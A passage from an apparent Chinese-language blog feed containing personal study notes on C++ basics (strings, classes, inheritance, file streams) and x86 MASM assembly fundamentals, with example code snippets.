szStr.data();</code>将一个字符串容器中的数据转换为 <code>char*</code> 指针。C++17以前是常量，以后是变量</p><p><strong>字符串拼接</strong></p><p>C++中+可以拼接字符串，<code>std::to_string</code>可以转换成字符串</p><pre class="language-C++" data-language="C++"><code class="language-C++">#include &lt;iostream&gt;#include &lt;string&gt;int main() &#123;    std::string szStr1(11, &#39;a&#39;);    std::string szStr2&#123;&quot;Admin&quot;&#125;;    int nNum&#123;1&#125;;        std::cout &lt;&lt; szStr1 &lt;&lt; std::endl;    std::cout &lt;&lt; szStr1 + szStr2 + std::to_string(nNum)&lt;&lt; std::endl;    return 0;&#125;</code></pre><p><strong>字符串切片</strong></p><p><code>szStr1.substr(3,4)</code>从3到4</p><p><strong>字符串比较</strong></p><p><code>int ret = szStr1.compare(&quot;Adminn&quot;);</code>szStr1大返回1，等于返回0，小于返回-1</p><p><strong>字符串查找</strong></p><p><code>szStr.find(&quot;dm&quot;)</code>，查找出现的位置</p><p><code>szStr.find_first_of(&quot;asd&quot;)</code>搜索到任意一个字符就停止返回匹配的位置</p><p><strong>字符串插入</strong></p><p><code>szStr2.insert(3, &quot;aa&quot;);</code>插入到第三个位置</p><p><strong>字符串替换</strong></p><p><code>szStr2.replace(3,2,&quot;aa&quot;);</code>  从第三个位置开始替换两个字符，不加字符则删除</p><p><strong>类型转换</strong></p><p><code>std::to_string(nNum)</code>替换成字符串,<code>std::stoi(szStr)</code>替换成int</p><h2 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h2><p><strong>函数重载</strong></p><p>函数重载，同名函数可根据返回值智能调用</p><pre class="language-c++" data-language="c++"><code class="language-c++">#include &lt;iostream&gt;int add(int a, int b);float add(float a, float b);int main() &#123;    int a&#123; 1 &#125;;    int b&#123; 2 &#125;;    float c&#123; 1.1 &#125;;    float d&#123; 2.2 &#125;;    int reta&#123; 0 &#125;;    float retb&#123; 0 &#125;;    reta &#x3D; add(a, b);    retb &#x3D; add(c, d);    std::cout &lt;&lt; reta &lt;&lt; &quot;\n&quot; &lt;&lt; retb &lt;&lt;std::endl;    return 0;&#125;int add(int a, int b)&#123;    return a + b;&#125;float add(float a, float b)&#123;    return a + b;&#125;</code></pre><p><strong>函数模板</strong></p><pre class="language-c++" data-language="c++"><code class="language-c++">#include &lt;iostream&gt;template &lt;typename T&gt; T add(T a, T b);int main() &#123;    std::cout &lt;&lt; add(1, 2) &lt;&lt; &quot;\n&quot; &lt;&lt; add&lt;float&gt;(1.1, 2.2) &lt;&lt;std::endl;    return 0;&#125;template&lt;typename T&gt;T add(T a, T b)&#123;    return a + b;&#125;</code></pre><p><strong>静态变量</strong></p><p><code>static</code>静态变量在进入函数时开始，结束程序时结束</p><pre class="language-c++" data-language="c++"><code class="language-c++">#include &lt;iostream&gt;void add(int a, int b);int main() &#123;    for (int i &#x3D; 0; i &lt; 20; i++)    &#123;        add(5,2);    &#125;    return 0;&#125;void add(int a, int b)&#123;    static int count&#123; 0 &#125;;    std::cout &lt;&lt;count&lt;&lt;std::endl;  &#x2F;&#x2F;打印0-19    count++;    a +&#x3D; b;&#125;</code></pre><h2 id="预处理器-1"><a href="#预处理器-1" class="headerlink" title="预处理器"></a>预处理器</h2><p>根C语言一样</p><pre class="language-c++" data-language="c++"><code class="language-c++">#include &lt;iostream&gt;#define ABC 5#if ABC &#x3D;&#x3D; 5#define AA 6#endifint main() &#123; #if ABC &#x3D;&#x3D; 5std::cout &lt;&lt; 5 &lt;&lt; std::endl;#elif ABC &#x3D;&#x3D; 6std::cout &lt;&lt; 6 &lt;&lt; std::endl;#elsestd::cout &lt;&lt; 7 &lt;&lt; std::endl;#endifstd::cout&lt;&lt; AA &lt;&lt; std::endl;return 0;&#125;</code></pre><p><strong>断言</strong></p><p><code>assert()</code>函数，条件为true无事，为false程序崩溃，导入头文件<code>#include &lt;assert.h&gt;</code></p><pre class="language-c++" data-language="c++"><code class="language-c++">#include &lt;iostream&gt;#include &lt;assert.h&gt;int main()&#123; int x&#123; 5 &#125;;int y&#123; 0 &#125;;assert(x &lt; y);return 0;&#125;</code></pre><p><code>static_assert()</code>J静态断言，不会崩溃只报错，不用头文件<code>#include &lt;assert.h&gt;</code></p><h2 id="类"><a href="#类" class="headerlink" title="类"></a>类</h2><p><code>cTest.h</code>创建类</p><pre class="language-c++" data-language="c++"><code class="language-c++">#pragma once#include &lt;iostream&gt;&#x2F;&#x2F;cTest.hclass Box&#123;private:int Length&#123; 5 &#125;;int width&#123; 5 &#125;;int heigth&#123; 5 &#125;;public:&#x2F;&#x2F;构造函数&#x2F;&#x2F;Box() &#x3D; default;  &#x2F;&#x2F;不做任何处理&#x2F;&#x2F;有参构造Box(int a, int b, int c);&#x2F;&#x2F;委托调用Box():Box(5, 5, 5) &#123; std::cout &lt;&lt; &quot;Hello Class&quot; &lt;&lt; std::endl; &#125;;&#x2F;&#x2F;析构函数~Box();int volume()&#123;return Length * width * heigth;&#125;int GetLength();int Getwidth();int Getheigth();&#125;;</code></pre><p><code>cTest.cpp</code>构造函数实现</p><pre class="language-c++" data-language="c++"><code class="language-c++">#include &quot;cTest.h&quot;Box::Box(int a, int b, int c)&#123;Length &#x3D; a;width &#x3D; b;heigth &#x3D; c;&#125;Box::~Box()&#123;&#125;int Box::GetLength()&#123;return Length;&#125;int Box::Getwidth()&#123;return width;&#125;int Box::Getheigth()&#123;return heigth;&#125;</code></pre><p><code>entry.cpp</code>调用</p><pre class="language-c++" data-language="c++"><code class="language-c++">#include &quot;cTest.h&quot;int main() &#123;Box MyBox;Box MyBox2&#123;MyBox&#125;;std::cout&lt;&lt; MyBox.volume()&lt;&lt;std::endl;std::cout&lt;&lt; MyBox2.volume()&lt;&lt;std::endl;&#125;</code></pre><p><code>Box():Box(5, 5, 5) &#123; std::cout &lt;&lt; &quot;Hello Class&quot; &lt;&lt; std::endl; &#125;;</code>委托调用，无参构造调用有参构造，先执行<code>std::cout &lt;&lt; &quot;Hello Class&quot; &lt;&lt; std::endl;</code>在进行调用赋值</p><p><code>Box MyBox2&#123;MyBox&#125;;</code>将已有对象的值复制给新对象，但是有指针不能复制，复制的是内存地址而不复制值</p><p><code>int Box::GetLength()</code>get方法，访问私有变量</p><p><strong>静态函数变量</strong></p><pre class="language-c++" data-language="c++"><code class="language-c++">#include &lt;iostream&gt;class MyClass &#123;private:    static int x;public:    static void staticFunc() &#123;        x &#x3D; 5;        std::cout &lt;&lt; x++&lt;&lt; std::endl;    &#125;&#125;;int MyClass::x &#x3D; 0;int main() &#123;    &#x2F;&#x2F; 静态函数可以在没有实例化对象的情况下调用    MyClass TheClass[100];    TheClass[2].staticFunc();    return 0;&#125;</code></pre><p>任意对象访问静态变量都是同一个对象，例如<code>MyClass TheClass[100];</code>和<code>int a[100]</code>一样定义100个MyClass 对象,每个TheClass访问到的都是同一个static静态对象</p><p><strong>this关键字</strong></p><p><code>this</code>关键字返回的就是Box的地址，相当于<code>Box MyBox;</code>的MyBox，可以直接调用</p><p>例如set方法：</p><p><code>MyBox.SetLength(1)-&gt;Setwidth(2)-&gt;Setheigth(3);</code>，调用不是点号.而是-&gt;</p><pre class="language-c++" data-language="c++"><code class="language-c++">Box* Box::SetLength(int a)&#123;Length &#x3D; a;return this;&#125;Box* Box::Setwidth(int a)&#123;width &#x3D; a;return this;&#125;Box* Box::Setheigth(int a)&#123;heigth &#x3D; a;return this;&#125;</code></pre><p><strong>友元函数</strong></p><p>函数原型前使用关键字 <code>friend</code></p><p>实例</p><pre class="language-C++" data-language="C++"><code class="language-C++">#include &lt;iostream&gt; using namespace std; class Box&#123;   double width;public:   friend void printWidth( Box box );   void setWidth( double wid );&#125;; &#x2F;&#x2F; 成员函数定义void Box::setWidth( double wid )&#123;    width &#x3D; wid;&#125; &#x2F;&#x2F; 请注意：printWidth() 不是任何类的成员函数void printWidth( Box box )&#123;   &#x2F;* 因为 printWidth() 是 Box 的友元，它可以直接访问该类的任何成员 *&#x2F;   cout &lt;&lt; &quot;Width of box : &quot; &lt;&lt; box.width &lt;&lt;endl;&#125; &#x2F;&#x2F; 程序的主函数int main( )&#123;   Box box;    &#x2F;&#x2F; 使用成员函数设置宽度   box.setWidth(10.0);      &#x2F;&#x2F; 使用友元函数输出宽度   printWidth( box );    return 0;&#125;</code></pre><p><strong>友元类</strong></p><p><code>friend class Tool;</code>在类里面声明<code>Tool</code>类可以访问<code>Point</code>的任何变量，但<code>Point</code>不能访问<code>Tool</code>类</p><p>实现：</p><pre class="language-c++" data-language="c++"><code class="language-c++">class Dadong&#123;public:Dadong();~Dadong();private:&#125;;</code></pre><p>实例</p><pre class="language-C++" data-language="C++"><code class="language-C++">#include&lt;iostream&gt;using namespace std;class Point&#123;private:    double x;    double y;public:    Point(double a, double b)    &#123;        x &#x3D; a;        y &#x3D; b;    &#125;    friend class Tool;&#125;;class Tool&#123;public:    double GetX(Point&amp; A)    &#123;        cout &lt;&lt; A.x &lt;&lt; endl;        return A.x;    &#125;    double GetY(Point&amp; A)    &#123;        cout &lt;&lt; A.y &lt;&lt; endl;        return A.y;    &#125;    double dis(Point&amp; A)    &#123;        cout &lt;&lt; sqrt(A.x * A.x + A.y * A.y) &lt;&lt; endl;        return  sqrt(A.x * A.x + A.y * A.y);    &#125;&#125;;int main()&#123;    Point A(2.0, 3.0);    Tool T;    T.GetX(A);    T.GetY(A);    T.dis(A);    return 0;&#125;</code></pre><h2 id="重载"><a href="#重载" class="headerlink" title="重载"></a>重载</h2><p>函数重载</p><pre class="language-C++" data-language="C++"><code class="language-C++">#include &lt;iostream&gt;using namespace std; class printData&#123;   public:      void print(int i) &#123;        cout &lt;&lt; &quot;整数为: &quot; &lt;&lt; i &lt;&lt; endl;      &#125;       void print(double  f) &#123;        cout &lt;&lt; &quot;浮点数为: &quot; &lt;&lt; f &lt;&lt; endl;      &#125;       void print(char c[]) &#123;        cout &lt;&lt; &quot;字符串为: &quot; &lt;&lt; c &lt;&lt; endl;      &#125;&#125;; int main(void)&#123;   printData pd;    &#x2F;&#x2F; 输出整数   pd.print(5);   &#x2F;&#x2F; 输出浮点数   pd.print(500.263);   &#x2F;&#x2F; 输出字符串   char c[] &#x3D; &quot;Hello C++&quot;;   pd.print(c);    return 0;&#125;</code></pre><blockquote><p>整数为: 5<br>浮点数为: 500.263<br>字符串为: Hello C++</p></blockquote><p><strong>运算符重载</strong></p><pre class="language-C++" data-language="C++"><code class="language-C++">#include &lt;iostream&gt;using namespace std;class Demo&#123;public:    Demo(int a)    &#123;        this-&gt;a &#x3D; a;    &#125;    &#x2F;&#x2F; 类成员函数实现运算符重载    Demo&amp; operator+ (int n)    &#123;        this-&gt;a -&#x3D; n;        return *this;    &#125;    int getA()    &#123;        return a;    &#125;private:    int a;&#125;;int main()&#123;    Demo demo(6);    &#x2F;&#x2F; 重载 &quot;+&quot; 运算符后，对象可以直接加一个数    demo &#x3D; demo + 2;    cout &lt;&lt; demo.getA() &lt;&lt; endl;    return 0;&#125;</code></pre><blockquote><p>输出4</p></blockquote><h2 id="继承"><a href="#继承" class="headerlink" title="继承"></a>继承</h2><p>单继承定义</p><pre class="language-C++" data-language="C++"><code class="language-C++">class&lt;派生类名&gt;:&lt;继承方式&gt;&lt;基类名&gt;&#123;&lt;派生类新定义成员&gt;&#125;;</code></pre><pre class="language-C++" data-language="C++"><code class="language-C++">class Base&#123;&#125;;class Derive1:public Base&#x2F;&#x2F;公有继承  派生类&#123;&#125;；class Derive2:protected Base &#x2F;&#x2F;保护继承派生类&#123;&#125;;class Derive3:private Base&#x2F;&#x2F;私有继承派生类&#123;&#125;;&#x2F;&#x2F;继承自Base基类</code></pre><p>实例</p><pre class="language-C++" data-language="C++"><code class="language-C++">#include &lt;iostream&gt; using namespace std; &#x2F;&#x2F; 基类class Shape &#123;   public:      void setWidth(int w)      &#123;         width &#x3D; w;      &#125;      void setHeight(int h)      &#123;         height &#x3D; h;      &#125;   protected:      int width;      int height;&#125;; &#x2F;&#x2F; 派生类class Rectangle: public Shape&#123;   public:      int getArea()      &#123;          return (width * height);       &#125;&#125;; int main(void)&#123;   Rectangle Rect;    Rect.setWidth(5);   Rect.setHeight(7);    &#x2F;&#x2F; 输出对象的面积   cout &lt;&lt; &quot;Total area: &quot; &lt;&lt; Rect.getArea() &lt;&lt; endl;    return 0;&#125;</code></pre><blockquote><p>Total area: 35</p></blockquote><p>多继承</p><pre class="language-C++" data-language="C++"><code class="language-C++">class A&#123;    int a;    void a()    &#123;&#125;&#125;;class B&#123;    int b;    void b()    &#123;&#125;&#125;;class C :public A, public B&#123;    int c;    void c()    &#123;&#125;&#125;;</code></pre><p>派生类可以访问基类中所有的非私有成员，访问权限</p><table><thead><tr><th align="left">访问</th><th align="left">public</th><th align="left">protected</th><th align="left">private</th></tr></thead><tbody><tr><td align="left">同一个类</td><td align="left">yes</td><td align="left">yes</td><td align="left">yes</td></tr><tr><td align="left">派生类</td><td align="left">yes</td><td align="left">yes</td><td align="left">no</td></tr><tr><td align="left">外部的类</td><td align="left">yes</td><td align="left">no</td><td align="left">no</td></tr></tbody></table><p>继承权限</p><ul><li><strong>公有继承（public）：</strong>当一个类派生自<strong>公有</strong>基类时，基类的<strong>公有</strong>成员也是派生类的<strong>公有</strong>成员，基类的<strong>保护</strong>成员也是派生类的<strong>保护</strong>成员，基类的<strong>私有</strong>成员不能直接被派生类访问，但是可以通过调用基类的<strong>公有</strong>和<strong>保护</strong>成员来访问。</li><li><strong>保护继承（protected）：</strong> 当一个类派生自<strong>保护</strong>基类时，基类的<strong>公有</strong>和<strong>保护</strong>成员将成为派生类的<strong>保护</strong>成员。</li><li><strong>私有继承（private）：</strong>当一个类派生自<strong>私有</strong>基类时，基类的<strong>公有</strong>和<strong>保护</strong>成员将成为派生类的<strong>私有</strong>成员。</li></ul><pre class="language-C++" data-language="C++"><code class="language-C++">class Derive :public Base   &#x2F;&#x2F;公有继承class Derive :protected Base &#x2F;&#x2F;保护继承class Derive :private Base  &#x2F;&#x2F;私有继承</code></pre><h2 id="多态"><a href="#多态" class="headerlink" title="多态"></a>多态</h2><pre class="language-C++" data-language="C++"><code class="language-C++">#include &lt;iostream&gt;using namespace std;class Animal&#123;public:virtual void speak()&#123;cout &lt;&lt; &quot;Animal&quot; &lt;&lt; endl;&#125;&#125;;class Cat:public Animal&#123;    void speak() &#123;cout &lt;&lt; &quot;Cat&quot; &lt;&lt; endl;&#125;&#125;;void DoSpeak(Animal&amp; animal) &#123;animal.speak();&#125;int main() &#123;Animal animal;DoSpeak(animal);Cat cat;DoSpeak(cat);&#125;</code></pre><p>虚函数关键字<code>virtual</code>。如果不加<code>virtual</code>关键字，输出两个Animal</p><h2 id="文件操作-1"><a href="#文件操作-1" class="headerlink" title="文件操作"></a>文件操作</h2><p>操作文件三大类</p><ol><li>ofstream:写操作</li><li>ifstream:读操作</li><li>fstream:读写操作</li></ol><table><thead><tr><th align="left">模式标志</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left">ios::app</td><td align="left">追加模式。所有写入都追加到文件末尾。</td></tr><tr><td align="left">ios::ate</td><td align="left">文件打开后定位到文件末尾。</td></tr><tr><td align="left">ios::in</td><td align="left">打开文件用于读取。</td></tr><tr><td align="left">ios::out</td><td align="left">打开文件用于写入。</td></tr><tr><td align="left">ios::trunc</td><td align="left">如果该文件已经存在，其内容将在打开文件之前被截断，即把文件长度设为 0。</td></tr></tbody></table><h3 id="文本文件"><a href="#文本文件" class="headerlink" title="文本文件"></a>文本文件</h3><p><strong>写操作</strong></p><ol><li>包含头文件</li></ol><p><code>#include &lt;fstream&gt;</code></p><ol start="2"><li>创建流对象</li></ol><p><code>ofstream ofs</code></p><ol start="3"><li>打开文件</li></ol><p><code>ofs.open(&quot;文件路径&quot;,打开模式)</code></p><ol start="4"><li>写数据</li></ol><p><code>ofs &lt;&lt;&quot;写入的数据&quot;</code></p><ol start="5"><li>关闭文件</li></ol><p><code>ofs.close()</code></p><pre class="language-C++" data-language="C++"><code class="language-C++">#include &lt;iostream&gt;using namespace std;#include &lt;fstream&gt;  &#x2F;&#x2F;包含头文件int main()&#123;ofstream ofs;  &#x2F;&#x2F;创建流对象ofs.open(&quot;test.txt&quot;, ios::out);   &#x2F;&#x2F;打开文件  不指定路径默认同级目录生成文件ofs &lt;&lt; &quot;My name is Admin1&quot; &lt;&lt; endl;  &#x2F;&#x2F;写数据ofs &lt;&lt; &quot;My name is Admin2&quot; &lt;&lt; endl;ofs &lt;&lt; &quot;My name is Admin3&quot; &lt;&lt; endl;ofs.close();  &#x2F;&#x2F;关闭文件return 0;&#125;</code></pre><p><strong>读操作</strong></p><pre class="language-C++" data-language="C++"><code class="language-C++">#include &lt;iostream&gt;#include &lt;fstream&gt;#include &lt;string&gt;using namespace std;int main()&#123;ifstream ifs;ifs.open(&quot;test.txt&quot;, ios::in);   &#x2F;&#x2F;不指定路径默认同级目录生成文件if (!ifs.is_open())  &#x2F;&#x2F;打开成功返回true &#123;cout &lt;&lt; &quot;文件打开失败&quot; &lt;&lt; endl;return 0;&#125;&#x2F;&#x2F;读数据&#x2F;&#x2F;char buf[1024] &#x3D; &#123; 0 &#125;;&#x2F;&#x2F;while (ifs &gt;&gt; buf)  &#x2F;&#x2F;读到最后返回假标志  ifstream &gt;&gt; buf 读取数据时，默认会以空白字符（空格、换行符、制表符等）作为分隔符&#x2F;&#x2F;&#123;&#x2F;&#x2F;cout &lt;&lt; buf &lt;&lt; endl;&#x2F;&#x2F;&#125;&#x2F;&#x2F;while (ifs.getline(buf, sizeof(buf)))   &#x2F;&#x2F;getline获取整行内容&#x2F;&#x2F;&#123;&#x2F;&#x2F;cout &lt;&lt; buf&lt;&lt;endl;&#x2F;&#x2F;&#125;string buf;while (getline(ifs, buf)) &#123;cout &lt;&lt; buf &lt;&lt; endl;&#125;&#x2F;&#x2F;一个一个读&#x2F;&#x2F;char c;&#x2F;&#x2F;while ((c &#x3D; ifs.get()) !&#x3D; EOF) &#123;&#x2F;&#x2F;cout &lt;&lt; c;&#x2F;&#x2F;&#125;ifs.close();return 0;&#125;</code></pre><h3 id="二进制文件"><a href="#二进制文件" class="headerlink" title="二进制文件"></a>二进制文件</h3><p><strong>写操作</strong></p><pre class="language-C++" data-language="C++"><code class="language-C++">#include &lt;iostream&gt;#include &lt;fstream&gt;#include &lt;string&gt;using namespace std;class Person&#123;public:char Name[64];int Age;&#125;;int main()&#123;ofstream ofs;ofs.open(&quot;person.txt&quot;, ios::out | ios::binary);Person p &#x3D; &#123; &quot;Admin&quot; ,18&#125;;ofs.write((const char *)&amp;p,sizeof(Person));ofs.close();return 0;&#125;</code></pre><p><strong>读操作</strong></p><pre class="language-C++" data-language="C++"><code class="language-C++">#include &lt;iostream&gt;#include &lt;fstream&gt;#include &lt;string&gt;using namespace std;class Person&#123;public:char Name[64];int Age;&#125;;int main()&#123;ifstream ifs;ifs.open(&quot;person.txt&quot;, ios::in | ios::binary);if (!ifs.is_open()) &#123;cout &lt;&lt; &quot;文件打开失败&quot;;return 0;&#125;Person p;ifs.read((char*)&amp;p, sizeof(Person));cout &lt;&lt; p.Name &lt;&lt; endl &lt;&lt; p.Age &lt;&lt; endl;ifs.close();return 0;&#125;</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> 二进制 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>汇编学习</title>
      <link href="/2024/11/11/2024-10-28-%E6%B1%87%E7%BC%96%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/"/>
      <url>/2024/11/11/2024-10-28-%E6%B1%87%E7%BC%96%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h1 id="基本指令"><a href="#基本指令" class="headerlink" title="基本指令"></a>基本指令</h1><p><strong>mov指令</strong></p><p><code>mov eax,5</code>将5放到eax中</p><p><strong>add减法指令</strong></p><p><code>add eax,6</code>加法指令</p><pre class="language-assembly" data-language="assembly"><code class="language-assembly">.586.MODEL flat,stdcalloption casemap:noneinclude windows.incinclude user32.incinclude kernel32.incinclude msvcrt.incincludelib user32.libincludelib kernel32.libincludelib msvcrt.lib.dataformat db &quot;%d&quot;,0.codemain proc;将5放到eax中mov eax,5;加法指令add eax,6push eaxpush offset formatcall crt_printfadd esp,8push 0call ExitProcessadd esp,4main ENDPEND main</code></pre><p><strong>sub减法指令</strong></p><p><code>sub eax,ecx</code>减法指令</p><p><strong>inc自增指令</strong></p><p><strong>dec自减指令</strong></p><p><strong>neg求补指令</strong></p><p>将目的操作数的所以数据位取反加1</p><p><strong>数据传送指令</strong></p><pre class="language-assembly" data-language="assembly"><code class="language-assembly">;操作数类型;立即数  阿拉伯数子 01234;寄存器操作数   eax,ebx...;内存操作数   引用的内存位置;reg  通用寄存器;reg8 reg16 reg32  表示8,16,32位的通用寄存器;sreg  段寄存器;imm 立即数;imm8 imm16 imm32;mem 内存;mem8 mem16 mem32;mov eax,1  mov操作数  eax和1是操作数;等效于 mov reg32,imm32  等长的;mov 目的操作数,源操作数   可以低到高,不能高到低;int a &#x3D; 15;mov a,15</code></pre><p>高到低</p><pre class="language-assembly" data-language="assembly"><code class="language-assembly">;mov eax,cx1.mov eax,FFFFFFFFmov eax,cx2.movzx eax,cx  ;低位变cx，高位填成03.movsx eax,cx  ;低位变cx，高位填成1</code></pre><p><strong>LAHF</strong></p><p>LAHF（加载状态标志位到 AH）</p><pre class="language-assembly" data-language="assembly"><code class="language-assembly">lahfmov flag,ah  ;用变量保存这些标志位</code></pre><p><strong>SAHF</strong></p><p>SAHF（保存 AH 内容到状态标志位）</p><pre class="language-assembly" data-language="assembly"><code class="language-assembly">lahfmov ah,flag</code></pre><p><strong>XCHG</strong></p><p>将一个字节或一个字的源操作数和目的操作数相交换。</p><pre class="language-assembly" data-language="assembly"><code class="language-assembly">xhcg ax,bx ;交换16位寄存器的值xchg ah,al ；交换8位寄存器的内容xchg var1,bx；交换16位内存操作数和BX寄存器的内容xchg eax,ebx ；交换32位寄存器内容</code></pre><p><strong>jmp无条件跳转指令</strong></p><pre class="language-assembly" data-language="assembly"><code class="language-assembly">lp:inc eaxjmp lp  ;跳到lp:处一直自增</code></pre><pre class="language-assembly" data-language="assembly"><code class="language-assembly">jmp lp   ;跳过自增inc eaxlp:</code></pre><p><strong>loop有条件跳转指令</strong></p><pre class="language-assembly" data-language="assembly"><code class="language-assembly">.codemain procxor eax,eaxmov ecx,10lp:inc eaxloop lp  ;根据ecx的值进行跳转,跳转十次</code></pre><p><strong>loopz,loopnz,loope,loopne</strong></p><p>loopz: ECX &gt; 0 and ZF &#x3D; 1</p><p>loopnz:ECX &gt; 0 and ZF &#x3D; 0</p><p>loope,loopne和loopz,loopnz功能无任何差别，操作码是相同的。</p><h2 id="运算符与伪指令"><a href="#运算符与伪指令" class="headerlink" title="运算符与伪指令"></a>运算符与伪指令</h2><p><strong>offset获取偏移地址</strong></p><ul><li>偏移地址是指变量或标号相对于段起始地址的字节偏移量。</li></ul><pre class="language-assembly" data-language="assembly"><code class="language-assembly">.dataszStr db &quot;Admin&quot;,0num dword 5arrNum DWORD 0,1,2,3,4,5varl db ?  ;不进行初始化.codemain procmov eax,offset arrNum + 4  ;offset取偏移地址  这里eax是偏移地址mov eax,[eax];间接寻址  类似于C语言 *p ;eax值为1call ExitProcessadd esp,4</code></pre><p><strong>ptr指定操作数的类型</strong></p><p>类似于C语言和Java的强转类型</p><pre class="language-assembly" data-language="assembly"><code class="language-assembly">.datanum dword 5.codemain procmov ax,word ptr num  ;dword32位,word16位call ExitProcessadd esp,4</code></pre><p><strong>type判断大小</strong></p><p>返回变量的当个元素的大小</p><pre class="language-assembly" data-language="assembly"><code class="language-assembly">.datavar1 BYTE ?  ;TYPE&#x3D;1var2 WORD ?  ;TYPE&#x3D;2var3 DWORD ? ;TYPE&#x3D;4var4 QWORD ? ;TYPE&#x3D;8</code></pre><p><strong>lengthof</strong></p><p>计算数组中元素的个数</p><p><code>offset lengthof arr</code></p><pre class="language-assembly" data-language="assembly"><code class="language-assembly">.databyte1 BYTE 10,20,30         ;3array1 WORD 30 dup(?),0,0   ;30+2array2 WORD 5 dup(3 dup(?)) ;5*3array3 DWORD 1,2,3,4        ;4digitStr BYTE &quot;12345678&quot;,0  ;9</code></pre><p><strong>sizeof</strong></p><p>计算数组占用空间</p><pre class="language-assembly" data-language="assembly"><code class="language-assembly">.dataintArray WORD 32 DUP(0).codemov eax,SIZEOF intArray ;EAX&#x3D;64</code></pre><p><strong>typedef</strong></p><p>定义一个新名字,在以后就可以代替，和C&#x2F;C++的typedef一样</p><pre class="language-assembly" data-language="assembly"><code class="language-assembly">pbyte typedef ptr byte.dataasd pbyte</code></pre><p><strong>test</strong></p><blockquote><p>test逻辑与运算结果为零,就把ZF(零标志)置1;</p></blockquote><p>ZF(Zero Flag)零标志,运算结果为0时置1,否则置0.</p><p>与AND运算一样但不修改寄存器结果，只修改ZF标志寄存器的值</p><p><strong>cmp</strong></p><blockquote><p>cmp 算术减法运算结果为零,就把ZF(零标志)置1.</p></blockquote><p>ZF(Zero Flag)零标志,运算结果为0时置1,否则置0.</p><p>CF(Carry Flag)进位标志,进位时置1,否则置0</p><p><code>cmp o1,o2</code>o1减o2</p><blockquote><p>o1大于o2,ZF设置位为0,CF为0</p><p>o1小于o2,ZF设置位为0,CF为1</p><p>o1等于o2,ZF设置位为1,CF为0</p></blockquote><h1 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h1><p>.data段：数据段</p><p>.code段：代码段</p><pre class="language-assembly" data-language="assembly"><code class="language-assembly">;内部数据类型;BYTE   8位  无符号;SBYTE  8位  有符号;WORD 16位   无符号整数;SWORD  16位  有符号整数;DWORD  32位  无符号;SDWORD   32位  有符号;FWORD  48位   都是有符号   用在保护模式的远指针;QWORD  64位   整数;TBYTE    80位  整数  ;实数 （浮点数）;REAL4  32位   短实数;REAL8   63位   长实数;REAL10   80位   扩展实数;伪指令;db  8位整数  类似于char 可以保存ASCII，所以可以保存字符串;dw  16位整数;dd  32位整数或者实数;dq  64位整数或者实数;dt  80位的整数</code></pre><p><strong>字符串</strong></p><p><code>szStr db &quot;Admin&quot;,0</code>添一个0，和C语言一样以\0结尾。类似于<code>char *szStr = &quot;Admin&quot;或者char szStr[] = &quot;Admin&quot;</code></p><p><strong>数组</strong></p><p><code>arrNum dword 20 dup(0)</code>申请20个整型，dup初始化成0,dup(?)空数组不进行初始化</p><p>赋值</p><pre class="language-assembly" data-language="assembly"><code class="language-assembly">.codemain procmov [arrNum],0  ;数组名是首地址mov [arrNum + 4],1  ;加一个数据类型长度mov [arrNum + 8],2push offset szStrcall crt_printfadd esp,4push 0call ExitProcessadd esp,4</code></pre><p><img src="D:\Doramer\文章\img\image-20241023100334382.png"></p><p><strong>比例因子遍历</strong></p><p>逆向出现<code>mov eax,var[esi * 4]</code>是数组</p><pre class="language-assembly" data-language="assembly"><code class="language-assembly">.datavar byte 0,1,2,3,4,5,6,7.codemain procmov esi,4mov eax,var[esi * 4]call ExitProcessadd esp,4</code></pre><p>跳转指令遍历</p><pre class="language-assembly" data-language="assembly"><code class="language-assembly">.586.MODEL flat,stdcalloption casemap:noneinclude windows.incinclude user32.incinclude kernel32.incinclude msvcrt.incincludelib user32.libincludelib kernel32.libincludelib msvcrt.lib.datasource byte &quot;This is Admin&quot;,0target byte sizeof source dup(0)   ;与source大小相同且初始值全为0的数组target.codemain procmov esi,0mov ecx,sizeof sourcelp:mov al,source[esi]mov target[esi],alinc esi   ;如果不是一个字节的，例如dword，就target[esi * 4] loop lppush 0call ExitProcessadd esp,4main ENDPEND main</code></pre><h1 id="堆栈"><a href="#堆栈" class="headerlink" title="堆栈"></a>堆栈</h1><p>先进后出，后进先出</p><p><code>push</code>压栈，<code>pop</code>出栈</p><p><code>push</code>  ESP-4，<code>pop</code>  ESP+4</p><p><strong>pushad，pushfd，pusha，pushf</strong></p><blockquote><p>pushad: 将所有的32位通用寄存器压入堆栈</p><p>pushfd:然后将32位标志寄存器EFLAGS压入堆栈</p><p>pusha:将所有的16位通用寄存器压入堆栈</p><p>pushf:将的16位标志寄存器EFLAGS压入堆栈</p><p>popad,popfd,popa,popf则反过来</p></blockquote><p>利用机制进行字符串反转</p><pre class="language-assembly" data-language="assembly"><code class="language-assembly">.586.MODEL flat,stdcalloption casemap:noneinclude windows.incinclude user32.incinclude kernel32.incinclude msvcrt.incincludelib user32.libincludelib kernel32.libincludelib msvcrt.lib.datasource byte &quot;This is Admin&quot;,0;target byte sizeof source dup(0)sourcesize &#x3D; ($ - source) - 1  ;字符串长度，和上一行代码一样.codemain procmov ecx,sourcesizemov esi,0lp1:movzx eax,source[esi]push eaxinc esiloop lp1mov ecx,sourcesizemov esi,0lp2:pop eaxmov source[esi],alinc esiloop lp2push 0call ExitProcessadd esp,4main ENDPEND main</code></pre><h1 id="函数定义"><a href="#函数定义" class="headerlink" title="函数定义"></a>函数定义</h1><p>eip:指令指针,永远指向下一条要执行的指令</p><p>call:</p><blockquote><ol><li><p>push eip</p></li><li><p>jmp  函数定义的地址(addx的地址)</p></li></ol></blockquote><p>ret:</p><blockquote><ol><li><p>pop eip</p></li><li><p>jmp eip  ;直接指向下一条指令</p></li></ol></blockquote><p>.code代码段里面声明</p><pre class="language-assembly" data-language="assembly"><code class="language-assembly">.codeaddx proc uses esi ecx   ;类似于形参add esi,ecxmov eax,esiretaddx endpmain procmov esi,5mov ecx,6push esipush ecxcall addxcall ExitProcessadd esp,4main ENDPEND main</code></pre><h1 id="JCC指令"><a href="#JCC指令" class="headerlink" 